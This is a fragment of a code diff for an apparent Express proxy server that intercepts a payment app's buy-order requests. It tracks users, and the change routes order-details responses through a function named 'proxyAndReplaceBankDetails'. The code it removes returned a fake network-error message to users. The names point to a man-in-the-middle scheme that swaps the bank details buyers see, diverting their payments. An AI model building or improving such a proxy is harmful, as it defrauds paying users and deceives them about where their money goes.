@@ -1323,9 +1323,12 @@ async function proxyAndAddBonus(req, res) {
 }
 
 app.post('/app/buy/order', async (req, res) => {
-  const data = await loadData();
+  const [data, proxyResult] = await Promise.all([
+    cachedData ? Promise.resolve(cachedData) : loadData(),
+    proxyFetch(req)
+  ]);
   try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const { response, respBody, respHeaders, jsonResp } = proxyResult;
     const userId = await extractUserId(req, jsonResp);
     if (userId) { trackUser(data, userId, 'Buy Order'); saveData(data).catch(()=>{}); }
     const buyData = getResponseData(jsonResp);
@@ -1361,13 +1364,7 @@ app.post('/app/buy/order', async (req, res) => {
 });
 
 app.all('/app/buy/order/details', async (req, res) => {
-  const data = await loadData();
-  const detectedUserId = await extractUserId(req, null);
-  const eff = getEffectiveSettings(data, detectedUserId);
-  if (eff.botEnabled !== false) {
-    return res.json({ code: -1, msg: 'Network error, please try again later', data: null });
-  }
-  await transparentProxy(req, res);
+  await proxyAndReplaceBankDetails(req, res, '💳 Order Details');
 });
 
 app.post('/app/buy/order/paid', async (req, res) => {
